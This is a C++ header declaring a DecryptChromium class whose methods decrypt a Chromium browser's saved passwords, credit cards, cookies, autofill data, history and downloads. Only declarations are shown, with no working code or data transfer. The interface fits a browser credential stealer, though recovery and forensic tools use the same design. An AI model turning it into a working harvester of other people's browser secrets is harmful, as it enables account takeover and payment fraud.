#pragma once
#include <string>
#include <vector>
#include "Common.h"
#include "BCrypt.h"
#include "BCrypt.h"

class DecryptChromium
{
public:

	//password
	static std::vector<Password> DecryptPassword(std::string DbPath, BROWSER browser = CHROME);
	//History
	static std::vector<Site> DecryptHistory(std::string DbPath);
	//Download
	static std::vector<Download> DecryptDownloads(std::string DbPath);
	//CreditCard
	static std::vector<CreditCard> DecryptCreditCard(std::string DbPath, BROWSER browser = CHROME);
	//Cookie
	static std::vector<Cookie> DecryptCookie(std::string DbPath, BROWSER browser = CHROME);
	//AutoFll
	static std::vector<AutoFill> DecryptAutoFill(std::string DbPath);
};

